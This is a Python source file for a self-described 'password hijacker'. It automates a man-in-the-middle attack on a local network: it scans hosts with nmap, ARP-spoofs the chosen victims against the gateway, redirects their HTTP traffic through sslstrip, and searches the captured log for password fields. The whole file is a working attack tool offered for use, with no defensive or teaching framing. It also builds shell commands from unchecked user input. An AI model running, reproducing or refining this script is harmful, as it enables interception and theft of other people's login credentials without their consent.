import re
import os
import sys
import time
import utils
import platform
from urllib.parse import unquote
from subprocess import Popen, PIPE

SUPPORTED = ['arch', 'debian', 'ubuntu', 'centos', 'fedora']


class PasswordHaijacker(object):
    """Main class"""
    def __init__(self):
        pass

    def main(self):
        self.check_args()
        self.print_welcome_message()
        print('Checking dependencies\n')
        self.install_dependencies()      
        print('Scanning network interfaces.\n')
        interfaces = self.get_interfaces()
        self.print_list(interfaces)
        interface = interfaces[int(input('\nSelect your interface.\t'))-1]
        print('Selected interface: %s\n' % interface)  
        print('Scanning networks.\n')
        networks = self.get_networks()
        self.print_list(networks)
        network = networks[int(input('\nSelect your network.\t'))-1]
        print('Selected network: %s\n' % network) 
        print('Scanning selected network...')
        hosts = self.get_hosts(network)
        getaway = hosts[0]
        self.print_list(hosts)
        selected_hosts = self.select_hosts(hosts)  
        print("Enabling IP packets forwarding.")
        self.ip_forward()
        print("Enabling HTTP traffic redirection. Port is 6000.")
        self.traffic_redirection()
        print("Starting arpspoof")
        self.arpspoof(interface, selected_hosts, getaway)
        logfile = os.path.abspath(input("Enter log file path. Default: ./log.txt\t") or "log.txt")
        print(logfile)
        self.start_sslstrip(logfile) 
        while input("Search passwords? [y/n]\t").lower() == 'y':
            self.search(logfile)

    def search(self, logfile):
        mod = os.stat(logfile).st_mtime
        regexp = "[0-9]+-[0-9]+-[0-9]*.*:.*\n*.*pass.*"
        while True:
            if os.stat(logfile).st_mtime != mod:
                res = '\n'.join(self.execute_command("strings %s" % logfile))
                res = re.findall(regexp, str(res))
                for i in res: print(unquote(i.replace('\n', ' ')))
                time.sleep(1)
                mod = os.stat(logfile).st_mtime    

    def clean_logfile(self, logfile):
        basename = os.path.basename(logfile)
        print(self.execute_command("strings %s > clean_%s" % (logfile, basename)))

    def print_welcome_message(self):  
        sep = '***********************************'
        welcome_message = """%s\nWelcome to the password hijacker.\n\n%s\n\nFolow the instructions.\n\nUse -r flag to revert changes \n
    Note that package autoinstall not tested on dpkg-based distributions.\n""" % (sep, sep)
        print(welcome_message)  

    def select_hosts(self, hosts):
        hosts_number = input('Select hosts separeted with commas. "*" for all\t')
        hosts_number = hosts_number.split(',') if '*' not in hosts else '*'
        selected_hosts = []
        if hosts_number[0] != '*':
            for host in hosts_number:
                selected_hosts.append(hosts[int(host)-1])
        else:
            selected_hosts = hosts  
        return selected_hosts            

    def print_list(self, list_):
        """Helper function to print list."""
        count = 0
        for item in list_:
            count+=1
            print('%s) %s' % (count, item))    

    def check_args(self):
        if '-r' in sys.argv or '--revert' in sys.argv:
            print("Reverting system configuration.")
            self.clean()
            exit()    

    def install_dependencies(self):
        dependencies = utils.Dependencies()
        if not dependencies.all_installed():
            install = input('Not all dependencies are installed. Do you want to install them automaticly? [Y/n]\t') or 'y'
            if install.lower() == 'n':
                exit(1)
            elif not platform.linux_distribution(supported_dists = SUPPORTED)[0]:
                exit('Your distribution is not supported yet. \nSorry :(')
            dependencies.install()                    

    def execute_command(self, command):
        process = Popen(command, shell=True, stdout=PIPE, stdin=PIPE).communicate()[0]
        res = process.decode("utf-8").splitlines()
        return res        

    def get_interfaces(self):
        return self.execute_command('ls /sys/class/net')
        

    def get_networks(self):
        return self.execute_command('ip r | grep -v default | awk \'{print $1}\'')

    def get_hosts(self, network):
        return self.execute_command("nmap -sP %s | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'" % network)

    def ip_forward(self):
        self.execute_command("echo 1 > /proc/sys/net/ipv4/ip_forward")   

    def traffic_redirection(self):
        self.execute_command("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 6000") 

    def arpspoof(self, interface, ips, getaway):
        for ip in ips:
            self.execute_command("arpspoof -i %s -t %s %s >> log2.txt 2>&1 &" % (interface, ip, getaway))        
        
    def start_sslstrip(self, logfile):
        self.execute_command("sslstrip -l 6000 -w %s >> /dev/null 2>&1 &" % logfile)

    def clean(self):
        self.execute_command("killall -9 arpspoof sslstrip >> /dev/null 2>&1 &")   
        self.execute_command("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 6000") 
        self.execute_command("echo 0 > /proc/sys/net/ipv4/ip_forward")


if __name__ == '__main__':
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    ph = PasswordHaijacker()    
    ph.main()       